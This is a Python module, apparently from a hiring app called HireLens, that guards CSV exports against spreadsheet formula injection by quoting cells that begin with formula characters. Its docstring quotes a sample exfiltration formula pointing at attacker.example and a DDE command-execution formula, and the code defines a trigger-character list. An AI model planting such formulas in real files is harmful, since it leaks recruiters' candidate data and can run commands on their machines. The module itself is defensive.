"""
HireLens — CSV formula-injection protection.

Spreadsheet software treats a cell whose text begins with `=`, `+`, `-` or
`@` as a FORMULA, not as text. So a CSV is not an inert data file: it is a
small program that runs when the recipient opens it.

That matters here more than in most apps, because of where these cells come
from. Every exported row carries a `candidate_name` extracted by an LLM from
a document a stranger uploaded, and a `file_name` the uploader chose
outright. A candidate who names their resume

    =HYPERLINK("https://attacker.example/"&A1,"Open me").pdf

gets that formula into the recruiter's export. Opening it in Excel or Google
Sheets can leak the surrounding cells — the rest of the candidate pipeline —
to a server the candidate controls. Older Excel installations extend this to
command execution via DDE (`=cmd|'/c calc'!A1`). The victim is the recruiter,
the attacker is an applicant, and the delivery mechanism is the product
working exactly as designed.

The fix is to make sure a formula-looking cell is stored as text. Prefixing
with a single quote is the standard approach and the one spreadsheet software
understands: Excel and Sheets strip the quote on display and never evaluate
the contents, so the recruiter still reads the original value.

Applied at every CSV boundary — the reports, bulk and JD-match exports — so
there is one place to look and no export that quietly missed it.
"""

# Characters that make a spreadsheet treat a cell as a formula.
#   = + - @  start an expression
#   tab / CR are stripped by some parsers, exposing whatever follows
_FORMULA_TRIGGERS = ("=", "+", "-", "@", "\t", "\r")


def csv_safe(value) -> str:
    """Return `value` as a CSV cell that cannot be evaluated as a formula.

    Non-strings pass through str() unchanged — a score or a timestamp cannot
    start with a trigger character, and coercing them keeps call sites simple.

    A leading `-` is included in the trigger list even though negative numbers
    legitimately start with one. Nothing exported here is a negative number,
    and treating "-1+1" as text is a far smaller cost than treating a crafted
    payload as a formula.
    """
    if value is None:
        return ""
    text = str(value)
    if text.startswith(_FORMULA_TRIGGERS):
        # The quote is a display-time marker: spreadsheets show the original
        # text without it and never evaluate the cell.
        return "'" + text
    return text


def csv_safe_row(values) -> list[str]:
    """csv_safe() applied across a whole row."""
    return [csv_safe(v) for v in values]
